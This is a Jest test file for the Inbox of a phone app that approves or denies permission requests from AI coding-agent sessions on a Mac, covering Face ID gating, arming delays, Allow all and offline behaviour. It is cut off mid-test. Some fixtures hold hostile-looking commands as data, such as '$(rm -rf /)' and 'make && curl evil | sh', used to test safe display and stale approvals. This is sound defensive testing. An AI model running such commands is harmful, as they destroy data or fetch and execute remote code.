import AsyncStorage from "@react-native-async-storage/async-storage";
import { act, fireEvent, within } from "@testing-library/react-native";
import * as Haptics from "expo-haptics";
import * as LocalAuthentication from "expo-local-authentication";
import { router, useLocalSearchParams } from "expo-router";
import { renderRouter, screen } from "expo-router/testing-library";
import * as SecureStore from "expo-secure-store";
import { AccessibilityInfo, AppState, StyleSheet, Text } from "react-native";

import RootLayout from "../app/_layout";
import Inbox from "../app/index";
import Pair from "../app/pair";
import { FakeClock, Sockets } from "./client/fakes";
import { HubContext, HubController, TOKEN_KEY } from "./hub";
import { closeDrawer } from "./drawer";
import * as inboxWords from "./inbox";
import * as navigation from "./navigation";
import { saveSettings } from "./persist";
import type { ApprovalInfo, SessionInfo } from "./protocol";
import { bestHub, octetStore } from "./store";
import { k, newM } from "./testKeys";
import { hideToast } from "./toast";
import { dark, light } from "./theme";

jest.mock("expo-camera", () => ({
  CameraView: () => null,
  useCameraPermissions: () => [{ granted: false, canAskAgain: false, status: "denied" }, jest.fn()],
}));

const TOKEN = "cd".repeat(32);
const auth = LocalAuthentication as jest.Mocked<typeof LocalAuthentication>;

const info = (id: string, extra: Partial<SessionInfo> = {}): SessionInfo => ({
  id,
  engine: "claude",
  workspace: `/Users/me/Projects/${id}`,
  mode: "ask",
  phase: "idle",
  approvals: 0,
  from_phone: false,
  ...extra,
});

const gist = (id: number, summary: Partial<ApprovalInfo["summary"]> = {}): ApprovalInfo => ({
  id,
  summary: { action: "Bash", command: `make test-${id}`, files: [], scope: "this command once", cwd: "/w", ...summary },
});

/** A session with one approval waiting, its gist on the row. */
const waiting = (id: string, approval: ApprovalInfo, extra: Partial<SessionInfo> = {}): SessionInfo =>
  info(id, { approvals: 1, phase: "running", approval, ...extra });

beforeEach(async () => {
  await AsyncStorage.clear();
  await SecureStore.setItemAsync(TOKEN_KEY, TOKEN);
  await saveSettings({ hubUrl: "wss://studio-mac.tail1234.ts.net/", faceId: false });
  octetStore.getState().reset();
  jest.spyOn(AppState, "addEventListener").mockImplementation(() => ({ remove: jest.fn() }));
  auth.hasHardwareAsync.mockResolvedValue(true);
  auth.isEnrolledAsync.mockResolvedValue(true);
  auth.authenticateAsync.mockResolvedValue({ success: true });
  auth.authenticateAsync.mockClear();
  jest.mocked(Haptics.notificationAsync).mockClear();
});
afterEach(() => {
  closeDrawer();
  hideToast();
  jest.restoreAllMocks();
});

/** Opens the app on the Inbox, paired and connected to a Mac that lists `list`. */
async function launch(list: SessionInfo[] | null) {
  const sockets = new Sockets();
  const clock = new FakeClock();
  const hub = new HubController({
    factory: sockets.factory,
    store: octetStore,
    platform: "ios",
    clientOptions: { now: clock.now, schedule: clock.schedule, random: () => 1 },
    newId: newM,
  });
  const Layout = () => (
    <HubContext.Provider value={hub}>
      <RootLayout />
    </HubContext.Provider>
  );
  const view = renderRouter({
    _layout: Layout,
    index: Inbox,
    pair: Pair,
    "session/[id]": function Session() {
      return <Text testID="opened">{useLocalSearchParams<{ id: string }>().id}</Text>;
    },
    recent: () => <Text>Recent screen</Text>,
    new: () => <Text>New session screen</Text>,
    settings: () => <Text>Settings screen</Text>,
    usage: () => null,
    changes: () => null,
  });
  await view;
  const rig = { hub, sockets, clock, view };
  if (list) {
    await screen.findByTestId("inbox-list");
    await hear(rig, list);
  }
  return rig;
}

type Rig = Awaited<ReturnType<typeof launch>>;

/** The Mac welcomes the phone (once) and lists `list`. */
async function hear({ sockets, clock }: Rig, list: SessionInfo[]) {
  await act(async () => {
    if (sockets.last.sent.length === 0) {
      sockets.last.open();
      sockets.last.receive({ type: "welcome", device: "iPhone" });
    }
    sockets.last.receive({ type: "sessions", sessions: list });
    clock.advance(50);
  });
}

// renderRouter runs on fake timers.
const wait = (ms: number) => act(async () => void jest.advanceTimersByTime(ms));
const flush = () => act(async () => {});
const card = (id: string) => screen.getByTestId(`inbox-card-${k(id)}`);
const inCard = (id: string) => within(card(id));
const answers = (rig: Rig) => rig.sockets.all.flatMap((s) => s.commandsOf("answer"));
const answered = (rig: Rig) => answers(rig).map(({ session, approval, allow }) => ({ session, approval, allow }));
const style = (node: { props: { style?: unknown } }) => StyleSheet.flatten(node.props.style as never) as Record<string, unknown>;
const disabled = (node: { props: { accessibilityState?: { disabled?: boolean } } }) => node.props.accessibilityState?.disabled === true;
const tab = (name: RegExp | string) => screen.getByRole("tab", { name });

/** Makes the next Face ID prompt wait; returns what settles it. */
const deferAuth = () => {
  let settle: (ok: boolean) => void = () => {};
  auth.authenticateAsync.mockImplementationOnce(
    () =>
      new Promise((resolve) => {
        settle = (ok) => resolve(ok ? { success: true } : { success: false, error: "user_cancel" });
      }),
  );
  return (ok = true) => act(async () => settle(ok));
};

describe("the Inbox", () => {
  describe("header", () => {
    it("says Inbox, and which Mac it talks to and whether it is online", async () => {
      const rig = await launch([info("a")]);
      expect(screen.getByText("Inbox")).toBeTruthy();
      expect(screen.getByText("● studio-mac · online")).toBeTruthy();
      await act(async () => {
        rig.sockets.last.drop();
      });
      expect(screen.getByText("● studio-mac · offline")).toBeTruthy();
    });

    it("has ☰ and + buttons of 44 pt: the menu (Settings until the drawer) and a new session", async () => {
      const { view } = await launch([info("a")]);
      const menu = screen.getByRole("button", { name: "Menu" });
      const plus = screen.getByRole("button", { name: "New session" });
      for (const b of [menu, plus]) {
        expect(Number(style(b).minHeight)).toBeGreaterThanOrEqual(44);
        expect(Number(style(b).minWidth)).toBeGreaterThanOrEqual(44);
      }
      await fireEvent.press(plus);
      expect(view.getPathname()).toBe("/new");
    });

    it("the menu opens the drawer, and Settings stays in reach there", async () => {
      const { view } = await launch([info("a")]);
      await fireEvent.press(screen.getByRole("button", { name: "Menu" }));
      expect(view.getPathname()).toBe("/");
      expect(screen.getByTestId("drawer")).toBeTruthy();
      await fireEvent.press(within(screen.getByTestId("drawer")).getByRole("button", { name: "Settings" }));
      expect(view.getPathname()).toBe("/settings");
    });
  });

  describe("tabs", () => {
    const list = () => [
      waiting("w1", gist(1), { last_activity: 300 }),
      waiting("w2", gist(2), { last_activity: 200 }),
      info("busy", { phase: "running", now: "Thinking" }),
      info("idle1"),
      info("idle2", { phase: "stopped" }),
    ];

    it("count what needs you and what runs, and open on Needs you", async () => {
      await launch(list());
      expect(tab("Needs you 2").props.accessibilityState).toMatchObject({ selected: true });
      expect(tab("Running 1")).toBeTruthy();
      expect(tab("Done")).toBeTruthy();
      expect(card("w1")).toBeTruthy();
      expect(card("w2")).toBeTruthy();
      expect(screen.queryByTestId(`inbox-card-${k("busy")}`)).toBeNull();
    });

    it("show each list on its tab", async () => {
      await launch(list());
      await fireEvent.press(tab("Running 1"));
      expect(card("busy")).toBeTruthy();
      expect(screen.queryByTestId(`inbox-card-${k("w1")}`)).toBeNull();
      expect(inCard("busy").getByText("● THINKING · claude")).toBeTruthy();
      await fireEvent.press(tab("Done"));
      expect(card("idle1")).toBeTruthy();
      expect(card("idle2")).toBeTruthy();
      expect(inCard("idle1").getByText("studio-mac · claude")).toBeTruthy();
    });

    it("leave out a count of none", async () => {
      await launch([info("a")]);
      expect(tab("Needs you")).toBeTruthy();
      expect(tab("Running")).toBeTruthy();
    });
  });

  describe("an approval card", () => {
    it("shows the session, its action and command in amber, what it allows, on a panel", async () => {
      await launch([waiting("octet", gist(1, { action: "Bash", command: "cargo test" }))]);
      const c = inCard("octet");
      expect(c.getByText("octet")).toBeTruthy();
      const status = c.getByText("● Bash · cargo test");
      expect([dark.amber, light.amber]).toContain(style(status).color);
      expect(c.getByText("this command once")).toBeTruthy();
      expect([dark.panel, light.panel]).toContain(style(card("octet")).backgroundColor);
      expect(c.getByRole("button", { name: "Allow once for octet" })).toBeTruthy();
      expect(c.getByRole("button", { name: "Deny for octet" })).toBeTruthy();
    });

    it("Allow once sends allow:true after Face ID and the arm, and never before 400 ms", async () => {
      await saveSettings({ faceId: true });
      const rig = await launch([waiting("a", gist(1, { action: "Run the tests" }))]);
      const allow = () => inCard("a").getByRole("button", { name: "Allow once for a" });
      expect(disabled(allow())).toBe(true);
      await fireEvent.press(allow());
      await wait(399);
      await fireEvent.press(allow());
      await flush();
      expect(auth.authenticateAsync).not.toHaveBeenCalled();
      expect(answers(rig)).toEqual([]);
      await wait(1);
      expect(disabled(allow())).toBe(false);
      await fireEvent.press(allow());
      await flush();
      expect(auth.authenticateAsync).toHaveBeenCalledTimes(1);
      expect(auth.authenticateAsync.mock.calls[0]?.[0]?.promptMessage).toContain("Run the tests");
      expect(answered(rig)).toEqual([{ session: "a", approval: 1, allow: true }]);
    });

    it("sends nothing when Face ID fails", async () => {
      await saveSettings({ faceId: true });
      auth.authenticateAsync.mockResolvedValueOnce({ success: false, error: "user_cancel" });
      const rig = await launch([waiting("a", gist(1))]);
      await wait(400);
      await fireEvent.press(inCard("a").getByRole("button", { name: "Allow once for a" }));
      await flush();
      expect(answers(rig)).toEqual([]);
    });

    it("sends once for two quick taps: one prompt, one answer", async () => {
      await saveSettings({ faceId: true });
      const rig = await launch([waiting("a", gist(1))]);
      await wait(400);
      const pass = deferAuth();
      await fireEvent.press(inCard("a").getByRole("button", { name: "Allow once for a" }));
      await fireEvent.press(inCard("a").getByRole("button", { name: "Allow once for a" }));
      await flush();
      await pass();
      expect(auth.authenticateAsync).toHaveBeenCalledTimes(1);
      expect(answers(rig)).toHaveLength(1);
    });

    it("Deny sends allow:false with no Face ID", async () => {
      await saveSettings({ faceId: true });
      const rig = await launch([waiting("a", gist(3))]);
      await wait(400);
      await fireEvent.press(inCard("a").getByRole("button", { name: "Deny for a" }));
      await flush();
      expect(auth.authenticateAsync).not.toHaveBeenCalled();
      expect(answered(rig)).toEqual([{ session: "a", approval: 3, allow: false }]);
    });

    it("a file edit offers Review, which opens the session, in place of Deny", async () => {
      const rig = await launch([waiting("a", gist(1, { action: "Edit", command: null, files: ["src/main.rs"] }))]);
      expect(inCard("a").getByText("● Edit")).toBeTruthy();
      expect(inCard("a").getByText("src/main.rs")).toBeTruthy();
      expect(inCard("a").queryByRole("button", { name: "Deny for a" })).toBeNull();
      await fireEvent.press(inCard("a").getByRole("button", { name: "Review a" }));
      expect(rig.view.getPathname()).toBe(`/session/${k("a")}`);
      expect(answers(rig)).toEqual([]);
    });

    it("a file edit shows every file of its gist, each on its own line, before Allow once", async () => {
      await launch([waiting("a", gist(1, { action: "Edit", command: null, files: ["src/main.rs", "src/lib.rs", "README.md"] }))]);
      const c = inCard("a");
      expect(c.getByText("● Edit")).toBeTruthy();
      for (const file of ["src/main.rs", "src/lib.rs", "README.md"]) expect(c.getByText(file)).toBeTruthy();
      expect(c.getByRole("button", { name: "Allow once for a" })).toBeTruthy();
    });

    it("a command that also lists files shows them under the command", async () => {
      await launch([waiting("a", gist(1, { command: "cargo fmt", files: ["a.rs", "b.rs"] }))]);
      const c = inCard("a");
      expect(c.getByText("● Bash · cargo fmt")).toBeTruthy();
      expect(c.getByText("a.rs")).toBeTruthy();
      expect(c.getByText("b.rs")).toBeTruthy();
    });

    it("an approval with neither command nor files can only be reviewed, and Allow all leaves it out", async () => {
      const rig = await launch([
        waiting("a", gist(1, { action: "Run Bash", command: null, files: [] })),
        waiting("b", gist(2)),
        waiting("c", gist(3)),
      ]);
      await wait(400);
      const c = inCard("a");
      expect(c.queryByRole("button", { name: /^Allow once/ })).toBeNull();
      expect(c.getByRole("button", { name: "Review a" })).toBeTruthy();
      const all = screen.getByRole("button", { name: "Allow all 2 once" });
      await fireEvent.press(all);
      await flush();
      expect(answered(rig).map((a) => a.session).sort()).toEqual(["b", "c"]);
    });

    it("a reduced summary (command … or files +N more) can only be reviewed", async () => {
      await launch([
        waiting("a", gist(1, { command: "…" })),
        waiting("b", gist(2, { action: "Edit", command: null, files: ["+25 more"] })),
      ]);
      await wait(400);
      for (const id of ["a", "b"]) {
        expect(inCard(id).queryByRole("button", { name: /^Allow once/ })).toBeNull();
        expect(inCard(id).getByRole("button", { name: `Review ${id}` })).toBeTruthy();
      }
      expect(screen.queryByRole("button", { name: /^Allow all/ })).toBeNull();
    });

    it("a session waiting without a gist can only be opened", async () => {
      const rig = await launch([info("a", { approvals: 1 })]);
      expect(inCard("a").queryByRole("button", { name: /^Allow once/ })).toBeNull();
      await fireEvent.press(inCard("a").getByRole("button", { name: "Review a" }));
      expect(rig.view.getPathname()).toBe(`/session/${k("a")}`);
    });

    it("a command the hub cut offers Review in place of Allow once, and still Deny", async () => {
      const rig = await launch([waiting("a", gist(1, { command: "cat > x <<EOF…" }))]);
      await wait(400);
      const c = inCard("a");
      expect(c.queryByRole("button", { name: /^Allow once/ })).toBeNull();
      expect(c.getAllByRole("button", { name: "Review a" })).toHaveLength(1);
      expect(c.getByRole("button", { name: "Deny for a" })).toBeTruthy();
      // No note drawn on the card: the label says it.
      expect(c.queryByText(/^Shortened/)).toBeNull();
      expect(c.getByRole("button", { name: /^a, / }).props.accessibilityLabel).toMatch(/Shortened: review it in the session$/);
      await fireEvent.press(c.getByRole("button", { name: "Review a" }));
      expect(rig.view.getPathname()).toBe(`/session/${k("a")}`);
      expect(answers(rig)).toEqual([]);
    });

    it("a file list the hub cut offers one Review and nothing to allow", async () => {
      await launch([waiting("a", gist(1, { action: "Edit", command: null, files: ["a.rs", "b.rs", "c.rs", "+2 more"] }))]);
      const c = inCard("a");
      expect(c.queryByRole("button", { name: /^Allow once/ })).toBeNull();
      expect(c.queryByRole("button", { name: /^Deny/ })).toBeNull();
      expect(c.getAllByRole("button", { name: "Review a" })).toHaveLength(1);
    });

    it("sends nothing when the link drops and comes back while Face ID is up, and arms again", async () => {
      await saveSettings({ faceId: true });
      const rig = await launch([waiting("a", gist(1))]);
      await wait(400);
      const pass = deferAuth();
      await fireEvent.press(inCard("a").getByRole("button", { name: "Allow once for a" }));
      await flush();
      await act(async () => {
        rig.sockets.last.drop();
      });
      await act(async () => {
        rig.clock.advance(60_000);
        rig.sockets.last.open();
        rig.sockets.last.receive({ type: "welcome", device: "iPhone" });
        rig.clock.advance(50);
      });
      expect(screen.getByText("● studio-mac · online")).toBeTruthy();
      await pass();
      expect(answers(rig)).toEqual([]);
      const allow = () => inCard("a").getByRole("button", { name: "Allow once for a" });
      expect(disabled(allow())).toBe(true);
      await wait(400);
      expect(disabled(allow())).toBe(false);
    });

    it("draws hub strings as plain text", async () => {
      await launch([waiting("a", gist(1, { action: "<b>rm</b>", command: "[x](https://evil.example)", scope: "$(rm -rf /)" }))]);
      expect(screen.getByText("● <b>rm</b> · [x](https://evil.example)")).toBeTruthy();
      expect(screen.getByText("$(rm -rf /)")).toBeTruthy();
    });

    it("shows the hub's words on a refusal", async () => {
      const rig = await launch([waiting("a", gist(1))]);
      await wait(400);
      await fireEvent.press(inCard("a").getByRole("button", { name: "Deny for a" }));
      await flush();
      const [sent] = answers(rig);
      await act(async () => {
        rig.sockets.last.receive({ type: "refused", req: sent?.req, reason: "That approval is already closed", code: "invalid" });
      });
      expect(inCard("a").getByText("That approval is already closed")).toBeTruthy();
    });

    describe("an_inbox_card_answered_elsewhere_sends_nothing", () => {
      it("closed while Face ID is up: the card goes and nothing is sent", async () => {
        await saveSettings({ faceId: true });
        const rig = await launch([waiting("a", gist(1))]);
        await wait(400);
        const pass = deferAuth();
        await fireEvent.press(inCard("a").getByRole("button", { name: "Allow once for a" }));
        await flush();
        expect(auth.authenticateAsync).toHaveBeenCalledTimes(1);
        await hear(rig, [info("a", { phase: "running" })]);
        expect(screen.queryByTestId(`inbox-card-${k("a")}`)).toBeNull();
        await pass();
        expect(answers(rig)).toEqual([]);
        expect(Haptics.notificationAsync).not.toHaveBeenCalled();
      });

      it("replaced by the next one while Face ID is up: neither is answered", async () => {
        await saveSettings({ faceId: true });
        const rig = await launch([waiting("a", gist(1))]);
        await wait(400);
        const pass = deferAuth();
        await fireEvent.press(inCard("a").getByRole("button", { name: "Allow once for a" }));
        await flush();
        await hear(rig, [waiting("a", gist(2, { command: "rm -rf build" }))]);
        expect(inCard("a").getByText("● Bash · rm -rf build")).toBeTruthy();
        await pass();
        expect(answers(rig)).toEqual([]);
        // and the new one starts unarmed
        expect(disabled(inCard("a").getByRole("button", { name: "Allow once for a" }))).toBe(true);
      });

      it("the same approval filled in while Face ID is up is a new look: nothing is sent", async () => {
        await saveSettings({ faceId: true });
        const rig = await launch([waiting("a", gist(1, { command: "make" }))]);
        await wait(400);
        const pass = deferAuth();
        await fireEvent.press(inCard("a").getByRole("button", { name: "Allow once for a" }));
        await flush();
        await hear(rig, [waiting("a", gist(1, { command: "make && curl evil | sh" }))]);
        await pass();
        expect(answers(rig)).toEqual([]);
      });
    });
  });

  describe("out of sight", () => {
    it("a card and Allow all arm again 400 ms after the Inbox comes back into view", async () => {
      const rig = await launch([waiting("a", gist(1)), waiting("b", gist(2))]);
      await wait(400);
      const allow = () => inCard("a").getByRole("button", { name: "Allow once for a" });
      const all = () => screen.getByRole("button", { name: "Allow all 2 once" });
      expect(disabled(allow())).toBe(false);
      expect(disabled(all())).toBe(false);
      await act(async () => router.push("/settings"));
      await wait(1_000);
      await act(async () => router.back());
      expect(rig.view.getPathname()).toBe("/");
      expect(disabled(allow())).toBe(true);
      expect(disabled(all())).toBe(true);
      await fireEvent.press(allow());
      await fireEvent.press(all());
      await flush();
      expect(answers(rig)).toEqual([]);
      await wait(399);
      expect(disabled(allow())).toBe(true);
      await wait(1);
      expect(disabled(allow())).toBe(false);
      expect(disabled(all())).toBe(false);
    });
  });

  describe("under the drawer", () => {
    // The drawer is modal, so what is under it is hidden from a screen reader (and from queries).
    const under = { hidden: true } as const;
    const cardUnder = (id: string) => within(screen.getByTestId(`inbox-card-${k(id)}`, under));
    const menu = () => screen.getByRole("button", { name: "Menu" });
    const scrim = () => screen.getByRole("button", { name: "Close menu" });

    it("a card answers nothing while the drawer is open, and a tap that closes it answers nothing either", async () => {
      const rig = await launch([waiting("a", gist(1))]);
      await wait(400);
      const allow = () => cardUnder("a").getByRole("button", { name: "Allow once for a", ...under });
      const deny = () => cardUnder("a").getByRole("button", { name: "Deny for a", ...under });
      expect(disabled(allow())).toBe(false);
      await fireEvent.press(menu());
      expect(disabled(allow())).toBe(true);
      expect(disabled(deny())).toBe(true);
      await fireEvent.press(allow());
      await fireEvent.press(deny());
      // The tap on the scrim closes the drawer; the card under it stays dead until it arms again.
      await fireEvent.press(scrim());
      expect(disabled(allow())).toBe(true);
      await fireEvent.press(allow());
      await fireEvent.press(deny());
      await flush();
      expect(answers(rig)).toEqual([]);
      await wait(399);
      expect(disabled(allow())).toBe(true);
      await wait(1);
      expect(disabled(allow())).toBe(false);
      await fireEvent.press(allow());
      await flush();
      expect(answered(rig)).toEqual([{ session: "a", approval: 1, allow: true }]);
    });

    it("Allow all waits too: dead while the drawer is open, armed again 400 ms after it closes", async () => {
      const rig = await launch([waiting("a", gist(1)), waiting("b", gist(2))]);
      await wait(400);
      const all = () => screen.getByRole("button", { name: "Allow all 2 once", ...under });
      expect(disabled(all())).toBe(false);
      await fireEvent.press(menu());
      expect(disabled(all())).toBe(true);
      await fireEvent.press(scrim());
      await fireEvent.press(all());
      await flush();
      expect(answers(rig)).toEqual([]);
      await wait(400);
      expect(disabled(all())).toBe(false);
    });

    it("the drawer opening while Face ID is up sends nothing", async () => {
      await saveSettings({ faceId: true });
      const rig = await launch([waiting("a", gist(1))]);
      await wait(400);
      const pass = deferAuth();
      await fireEvent.press(cardUnder("a").getByRole("button", { name: "Allow once for a" }));
      await flush();
      await fireEvent.press(menu());
      await pass();
      expect(answers(rig)).toEqual([]);
    });
  });

  describe("the bottom button", () => {
    it("is New session with fewer than two approvals, and opens a new session", async () => {
      const { view } = await launch([waiting("a", gist(1))]);
      const button = screen.getByRole("button", { name: "Start a new session" });
      expect(within(button).getByText("New session")).toBeTruthy();
      await fireEvent.press(button);
      expect(view.getPathname()).toBe("/new");
    });

    it("is Allow all N once with two or more, armed 400 ms after they show", async () => {
      await saveSettings({ faceId: true });
      const rig = await launch([
        waiting("a", gist(1), { last_activity: 30 }),
        waiting("b", gist(2), { last_activity: 20 }),
      ]);
      const all = () => screen.getByRole("button", { name: "Allow all 2 once" });
      expect(disabled(all())).toBe(true);
      await fireEvent.press(all());
      await flush();
      expect(auth.authenticateAsync).not.toHaveBeenCalled();
      await wait(400);
      await fireEvent.press(all());
      await flush();
      expect(auth.authenticateAsync).toHaveBeenCalledTimes(1);
      expect(answered(rig)).toEqual([
        { session: "a", approval: 1, allow: true },
        { session: "b", approval: 2, allow: true },
      ]);
    });

    it("allow_all_skips_closed_and_new: one Face ID; a closed one is skipped; one that came after the tap is not answered", async () => {
      await saveSettings({ faceId: true });
      const rig = await launch([
        waiting("a", gist(1), { last_activity: 30 }),
        waiting("b", gist(2), { last_activity: 20 }),
        waiting("c", gist(3), { last_activity: 10 }),
      ]);
      await wait(400);
      const pass = deferAuth();
      await fireEvent.press(screen.getByRole("button", { name: "Allow all 3 once" }));
      await flush();
      expect(auth.authenticateAsync).toHaveBeenCalledTimes(1);
      // While Face ID is up: a is answered at the desk, c's request changes, and d arrives.
      await hear(rig, [
        info("a", { phase: "running", last_activity: 30 }),
        waiting("b", gist(2), { last_activity: 20 }),
        waiting("c", gist(4), { last_activity: 10 }),
        waiting("d", gist(5), { last_activity: 40 }),
      ]);
      await pass();
      expect(auth.authenticateAsync).toHaveBeenCalledTimes(1);
      expect(answered(rig)).toEqual([{ session: "b", approval: 2, allow: true }]);
    });

    it("sends nothing when the link drops and comes back while Face ID is up", async () => {
      await saveSettings({ faceId: true });
      const rig = await launch([waiting("a", gist(1), { last_activity: 30 }), waiting("b", gist(2), { last_activity: 20 })]);
      await wait(400);
      const pass = deferAuth();
      await fireEvent.press(screen.getByRole("button", { name: "Allow all 2 once" }));
      await flush();
      expect(auth.authenticateAsync).toHaveBeenCalledTimes(1);
      await act(async () => {
        rig.sockets.last.drop();
      });
      expect(screen.getByText("Can't reach your Mac")).toBeTruthy();
      await act(async () => {
        rig.clock.advance(60_000);
        rig.sockets.last.open();
        rig.sockets.last.receive({ type: "welcome", device: "iPhone" });
        rig.sockets.last.receive({ type: "sessions", sessions: [waiting("a", gist(1), { last_activity: 30 }), waiting("b", gist(2), { last_activity: 20 })] });
        rig.clock.advance(50);
      });
      expect(screen.queryByText("Can't reach your Mac")).toBeNull();
      await pass();
      expect(answers(rig)).toEqual([]);
      expect(Haptics.notificationAsync).not.toHaveBeenCalled();
    });

    it("leaves out a shortened request: not counted, not answered", async () => {
      const rig = await launch([
        waiting("a", gist(1), { last_activity: 30 }),
        waiting("b", gist(2, { command: "cat <<EOF…" }), { last_activity: 20 }),
        waiting("c", gist(3), { last_activity: 10 }),
      ]);
      await wait(400);
      await fireEvent.press(screen.getByRole("button", { name: "Allow all 2 once" }));
      await flush();
      expect(answered(rig)).toEqual([
        { session: "a", approval: 1, allow: true },
        { session: "c", approval: 3, allow: true },
      ]);
    });

    it("is New session with a shortened request and one other", async () => {
      await launch([waiting("a", gist(1)), waiting("b", gist(2, { files: ["x", "+1 more"], command: null, action: "Edit" }))]);
      expect(screen.queryByRole("button", { name: /^Allow all/ })).toBeNull();
      expect(screen.getByRole("button", { name: "Start a new session" })).toBeTruthy();
    });

    it("shows only on Needs you, and arms again on coming back to it", async () => {
      const rig = await launch([waiting("a", gist(1)), waiting("b", gist(2)), info("r", { phase: "running" })]);
      await wait(400);
      expect(disabled(screen.getByRole("button", { name: "Allow all 2 once" }))).toBe(false);
      await fireEvent.press(tab("Running 1"));
      expect(screen.queryByRole("button", { name: /^Allow all/ })).toBeNull();
      expect(screen.getByRole("button", { name: "Start a new session" })).toBeTruthy();
      await fireEvent.press(tab("Done"));
      expect(screen.queryByRole("button", { name: /^Allow all/ })).toBeNull();
      await fireEvent.press(tab("Needs you 2"));
      const all = () => screen.getByRole("button", { name: "Allow all 2 once" });
      expect(disabled(all())).toBe(true);
      await fireEvent.press(all());
      await flush();
      expect(answers(rig)).toEqual([]);
      await wait(400);
      expect(disabled(all())).toBe(false);
    });

    it("does not count a request already answered from its card", async () => {
      const rig = await launch([waiting("a", gist(1)), waiting("b", gist(2)), waiting("c", gist(3))]);
      await wait(400);
      await fireEvent.press(inCard("a").getByRole("button", { name: "Allow once for a" }));
      await flush();
      const [sent] = answers(rig);
      await act(async () => {
        rig.sockets.last.receive({ type: "ack", req: sent?.req, message: "ok" });
      });
      expect(screen.getByRole("button", { name: "Allow all 2 once" })).toBeTruthy();
    });

    it("its refusal clears when the requests change", async () => {
      const rig = await launch([waiting("a", gist(1)), waiting("b", gist(2))]);
      await wait(400);
      await fireEvent.press(screen.getByRole("button", { name: "Allow all 2 once" }));
      await flush();
      const [first] = answers(rig);
      await act(async () => {
        rig.sockets.last.receive({ type: "refused", req: first?.req, reason: "The Mac is busy", code: "busy" });
      });
      expect(screen.getByText("The Mac is busy")).toBeTruthy();
      await hear(rig, [waiting("a", gist(1)), waiting("b", gist(2)), waiting("c", gist(3))]);
      expect(screen.queryByText("The Mac is busy")).toBeNull();
    });

    it("Allow all sends nothing when Face ID fails", async () => {
      await saveSettings({ faceId: true });
      auth.authenticateAsync.mockResolvedValueOnce({ success: false, error: "user_cancel" });
      const rig = await launch([waiting("a", gist(1)), waiting("b", gist(2))]);
      await wait(400);
      await fireEvent.press(screen.getByRole("button", { name: "Allow all 2 once" }));
      await flush();
      expect(answers(rig)).toEqual([]);
    });

    it("an approval answered from its card is not answered again by Allow all", async () => {
      const rig = await launch([
        waiting("a", gist(1), { last_activity: 30 }),
        waiting("b", gist(2), { last_activity: 20 }),
      ]);
      await wait(400);
      await fireEvent.press(inCard("a").getByRole("button", { name: "Allow once for a" }));
      await flush();
      await fireEvent.press(screen.getByRole("button", { name: "Allow all 2 once" }));
      await flush();
      expect(answered(rig)).toEqual([
        { session: "a", approval: 1, allow: true },
        { session: "b", approval: 2, allow: true },
      ]);
    });
  });

  describe("empty states", () => {
    const mascot = () => screen.getByRole("image");

    it("nothing needs you: the success mascot, 59 wide", async () => {
      await launch([info("a")]);
      expect(screen.getByText("Nothing needs you.")).toBeTruthy();
      expect(mascot().props.accessibilityLabel).toBe("Octet, success");
      expect(mascot().props.width).toBe(59);
    });

    it("nothing running, and no finished sessions: the sleeping mascot", async () => {
      await launch([waiting("a", gist(1))]);
      await fireEvent.press(tab("Running"));
      expect(screen.getByText("Nothing running.")).toBeTruthy();
      expect(mascot().props.accessibilityLabel).toBe("Octet, sleeping");
      await fireEvent.press(tab("Done"));
      expect(screen.getByText("No finished sessions.")).toBeTruthy();
      expect(mascot().props.accessibilityLabel).toBe("Octet, sleeping");
    });

    it("offline, each says so", async () => {
      const rig = await launch([]);
      await act(async () => {
        rig.sockets.last.drop();
      });
      expect(screen.getByText("Nothing needs you (offline).")).toBeTruthy();
      await fireEvent.press(tab("Running"));
      expect(screen.getByText("Nothing running (offline).")).toBeTruthy();
      await fireEvent.press(tab("Done"));
      expect(screen.getByText("No finished sessions (offline).")).toBeTruthy();
    });

    it("says it is loading until the Mac sends the list, not that there are none", async () => {
      const rig = await launch(null);
      await screen.findByTestId("inbox-list");
      await act(async () => {
        rig.sockets.last.open();
        rig.sockets.last.receive({ type: "welcome", device: "iPhone" });
        rig.clock.advance(50);
      });
      expect(screen.getByText("Loading sessions…")).toBeTruthy();
      expect(screen.queryByText("Nothing needs you.")).toBeNull();
      await hear(rig, []);
      expect(screen.queryByText("Loading sessions…")).toBeNull();
      expect(screen.getByText("Nothing needs you.")).toBeTruthy();
    });
  });

  describe("offline", () => {
    it("a banner over the last list, greyed, and its cards do nothing", async () => {
      const rig = await launch([waiting("a", gist(1)), waiting("b", gist(2))]);
      await wait(400);
      await act(async () => {
        rig.sockets.last.drop();
      });
      expect(screen.getByText("Can't reach your Mac")).toBeTruthy();
      expect(Number(style(card("a")).opacity)).toBeLessThan(1);
      const open = inCard("a").getByRole("button", { name: /^a, / });
      expect(disabled(open)).toBe(true);
      await fireEvent.press(open);
      expect(rig.view.getPathname()).toBe("/");
      const allow = inCard("a").getByRole("button", { name: "Allow once for a" });
      expect(disabled(allow)).toBe(true);
      await fireEvent.press(allow);
      await fireEvent.press(inCard("a").getByRole("button", { name: "Deny for a" }));
      expect(disabled(screen.getByRole("button", { name: "Allow all 2 once" }))).toBe(true);
      await fireEvent.press(screen.getByRole("button", { name: "Allow all 2 once" }));
      await flush();
      expect(answers(rig)).toEqual([]);
    });

    it("is usable again when the Mac comes back, armed 400 ms on", async () => {
      const rig = await launch([waiting("a", gist(1))]);
      await act(async () => {
        rig.sockets.last.drop();
      });
      await act(async () => {
        rig.clock.advance(60_000);
        rig.sockets.last.open();
        rig.sockets.last.receive({ type: "welcome", device: "iPhone" });
        rig.clock.advance(50);
      });
      expect(screen.queryByText("Can't reach your Mac")).toBeNull();
      expect(disabled(inCard("a").getByRole("button", { name: /^a, / }))).toBe(false);
      const deny = () => inCard("a").getByRole("button", { name: "Deny for a" });
      expect(disabled(deny())).toBe(true);
      await wait(400);
      expect(disabled(deny())).toBe(false);
    });

    it("the banner is a polite live region and is announced when its words change", async () => {
      const announce = jest.spyOn(AccessibilityInfo, "announceForAccessibility");
      const rig = await launch([info("a")]);
      announce.mockClear();
      await act(async () => {
        rig.sockets.last.drop();
      });
      expect(screen.getByLabelText("Can't reach your Mac").props.accessibilityLiveRegion).toBe("polite");
      expect(announce).toHaveBeenCalledWith("Can't reach your Mac");
    });
  });

  describe("opening a session", () => {
    it("tapping a card opens that session", async () => {
      const { view } = await launch([info("a"), info("b")]);
      await fireEvent.press(tab("Done"));
      await fireEvent.press(screen.getByRole("button", { name: /^b, / }));
      expect(view.getPathname()).toBe(`/session/${k("b")}`);
    });

    it("opens a session whose id is odd as that session, not as another route", async () => {
      const { view } = await launch([info("a/../b?x=1", { approvals: 1 })]);
